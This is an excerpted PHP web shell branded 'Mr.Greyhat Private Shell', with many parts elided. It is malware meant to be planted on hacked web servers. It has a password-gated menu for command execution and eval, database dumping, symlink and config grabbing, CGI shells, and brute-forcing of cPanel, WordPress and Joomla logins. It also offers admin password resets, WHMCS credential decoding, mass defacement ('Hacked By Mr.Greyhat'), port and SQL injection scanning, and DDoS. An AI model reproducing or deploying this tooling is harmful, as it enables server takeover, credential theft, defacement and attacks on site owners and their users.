...
<?php
$auth_pass = "59211fb316f5ac4523b7acadeabd7754";
$color = "#e20800";
...
$system = @php_uname();
// mysql
function showstat($stat) {if ($stat=="on") {return "<b><font style='color:#ff8100'>ON</font></b>";}else {return "<b><font style='color:#DD4736'>OFF</font></b>";}}
...
else { return "<span style='color:#e20800'><b>NONE</b></span>"; }
}
...
$buff .= "Free Disk: "."<span style='color:#E20800'><b>".convertByte(disk_free_space("/"))." / ".convertByte(disk_total_space("/"))."</b></span><br />";
...
$buff .= "<font color=E20800 ><b>".$letters."&nbsp;&gt;&nbsp;".$pwdurl."</b></font>";
function rapih($text){
...
?>
<html><head>
<link rel="SHORTCUT ICON" href="http://i.imgur.com/qH05gqn.png"><title>Mr.Greyhat Private Shell</title>
...
border-bottom:1px solid #e20800;
border-top:1px solid #e20800;
}
.output {
margin:auto;
...
<div class="head_info">
<table ><tr>
<td><table class="b374k_tbl"><tr><td><a href="?"><span class="b374k"><img src="http://i.imgur.com/qH05gqn.png" border="0" height="200" width="200" alt="class"/></a></span></a></td></tr><tr><td><b><span id="Anonymous">[ Mr.Greyhat </span><span id="moded">Private Shell <span id="moded1">~CSI]</span></span></b></td></tr></table></td>
<td><?php echo $buff; ?></td>
</tr></table>
</div>
<!-- head info end here -->
...
<div id="menu">
<tr>
<td><a href="?<?php echo "y=".$pwd; ?>"><img src='data:image/png;base64,' height="10" width="34"></a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=shell">Shell</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=php">Eval</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=sql">Mysql</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=dump">Database Dump</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo">Php Info</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit">Net Sploit</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=upload">Upload</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=mail">E-Mail</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=sqli-scanner">SQLI Scan</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=port-sc">Port Scan</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=dos">Ddos</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=tool">Tools</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=python">python</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=symlink">Symlink</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=config">Config</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=cgi">CgiShell</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=cgi2012">CGI Telnet 2012</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=domain">Domain</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=jodexer">Joomla IndChange</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=vb">VB IndChange</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=wp-reset">Wordpress ResPass</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=jm-reset">Joomla ResPass</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=whmcs">WHMCS Decoder</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=zone">Zone-H</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=mass">Mass Deface</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=wpbrute">Wordpress BruteForce</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=jbrute">Joomla BruteForce</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=brute">Cpanel BruteForce</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=bypass-cf">Bypass CloudFlare</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=adfin">Admin Finder</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=hash">Password Hash</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=hashid">Hash ID</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=string">Script Encode</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=whois">Website Whois</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=jss">Joomla Server Scanner</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=cms_detect">Cms Detector</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=tutor">Tutorial & Ebook</a></td>
<td><a href="?<?php echo "y=".$pwd; ?>&amp;x=about">About</a></td>
<td><a href="?<?php echo "y=".$pwd;	?>&amp;x=logout">Log-Out</a></td>
</tr>
</div>
<!-- menu end -->
...
<?php
echo "<center/><br/><b><font color=#FFDF00>+--==[ Mysql Interface ]==--+</font></b><br><br>";
mkdir('mysql', 0755);
chdir('mysql');
$akses = ".htaccess";
$buka_lah = "$akses";
...
{
echo "X'1n73ct~ user is (<b><font color=red>$user</font></b>) Password is (<b><font color=red>$pass</font></b>)<br />";
$ok++;
}
}
}
}
echo "<hr><b>You Found <font color=red>$ok</font> Cpanel by x'1n73ct</b>";
...
</strong><br><br><center><font size="5" style="italic" color="#FFDF00">=[ Cpanel BruteForce ]=</font></center><br><br>
<table width="600" border="0" cellpadding="3" cellspacing="1" align="center">
<tr>
<td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
<center><b><font size="5" style="italic" color="#FFDF00">Cpanel BruteForce</font></b></center></td></tr>
<tr>
<td>
...
{
echo "<font color=#e20800>No Security for Function</font></b>";
}else{
...
<tr>
<td>Host</td>
<td><input type="text" class="inputz" style="width:220px;color:#FFDF00;" name="host" value="localhost"/></td>
</tr>
<tr>
<td>Port start</td>
<td><input type="text" class="inputz" style="width:220px;color:#FFDF00;" name="start" value="0"/></td>
</tr>
<tr><td>Port end</td>
<td><input type="text" class="inputz" style="width:220px;color:#FFDF00;" name="end" value="5000"/></td>
</tr><td><input class="inputzbut" type="submit" style="color:#FFDF00" value="Scan Ports" />
...
echo "
<br><center><font size='5' color='#e20800'><b>-=[ WHMCS Decoder ]=-</b></font></center>
<center>
<br>
...
<tr><td>db_host </td><td><input type='text' style='color:#e20800;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#e20800;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#e20800;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#e20800;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#e20800;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#e20800;background-color:' value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";
...
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#e20800'>Correct
...
{
echo "<center/><br/><b><font color=#e20800>-=[ Mass Deface ]=-</font></b><br>";
error_reporting(0);?>
...
<textarea style='background:black;outline:none;' name='index' rows='10' cols='67'>Hacked By Mr.Greyhat | | Please Patch your system now!</textarea><br>
...
<b><font color="#e20800">+--=[ VB Index Changer ]=--+</font></b>
</div><br>
<?
...
<?php
echo "<center/><br/><b><font color=#e20800>-=[ Command Bypass Exploit ]=-</font></b><br>
";
print_r('
<pre>
<form method="POST" action="">
<b><font color=#e20800><b><font color="#e20800">Command :=) </font></font></b><input name="baba" type="text" class="inputz" size="34"><input type="submit" class="inputzbut" value="Go">
</form>
<form method="POST" action=""><strong><b><font color="#e20800">Menu Bypass :=) </font></strong><select name="liz0" size="1" class="inputz">
...
<center><br><br>
<font color="#e20800" size='+3'><b>+--=[ Automatic Joomla Index Changer ]=--+</b></font><br><br>
</center>
<center><b>
...
echo "<center/><br/><b><font color=#e20800>+--==[ Config Shell Priv8 SCR ]==--+</font></b><br><br>";
...
echo "<center/><br/><b><font color=#e20800>+--==[ Wordpress Reset Password ]==--+</font></b><br><br>";
...
echo "<center/><br/><b><font color=#e20800>+--==[ Joomla Reset Password ]==--+</font></b><br><br>";
if(empty($_POST['pwd'])){
...
show('<span style="color: #e20800;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
...
<center><p>Thanks To <a href="https://www.facebook.com/Cyber.S.International" target="_blank">Cyber Security International</a></p></b></center>
...
{
$hacked = 1;
echo "<p>".$host." => UserName : [<font color='red'>".$username."</font>] : Password : [<font color='red'>".$password."</font>]</p>";
...
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#e20800' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
...
if($connect)
{
echo " $ip : $o_port ??? <u style=\"color: #e20800\">Open</u> <br /><br />";
flush();
}
}
}
...
<tr><td>Site to scan </td><td>:</td><td><input type="text" name="site" size="50" style="color:#e20800;background-color:#000000" class="inputz" value="site.com" /> &nbsp <input class="inputzbut" type="submit" style="color:#e20800;background-color:#000000" name="scan" value="Scan !" /></td></tr>
</table></form></div>';
if(isset($_POST['scan']))
{
...
<center><br><br><img src=''>
<br>Aldjazara<br><font size="5" color="#e20800">Tanks to:</font></center><center>
<marquee direction="up" scrollamount="2" bgcolor="" width="250" height="40"><center>
<p><b><font size="3" color="#e20800"><br><br>
</font></b></p>
</center>
...
echo '<br><br><center><form method="post" action=""><b><font color="red">Dork : </font></b> &nbsp;&nbsp;<input class="inputz" type="text" value="" name="dork" style="color:#e20800;background-color:#000000" size="20"/><input class="inputzbut" type="submit" style="color:#e20800;background-color:#000000" name="scan" value="Scan"></form></center>';
...
echo '<center><font color="#FFFFFF"><b>'.$url.'</b></font><font color="#e20800"> &#60;-- Not Vuln</font></center>';
ob_flush();flush();
}
ob_flush();flush();
}
...
?><center><br><br><div class="info"> <b></b> </div><br>
<div class="jaya">[+] Anonymous General Santos [+] <br><br>&copy; Mr.Greyhat | Cyber Security International 2016</div></center><br><br>
</script>
</div>
</body>
</html>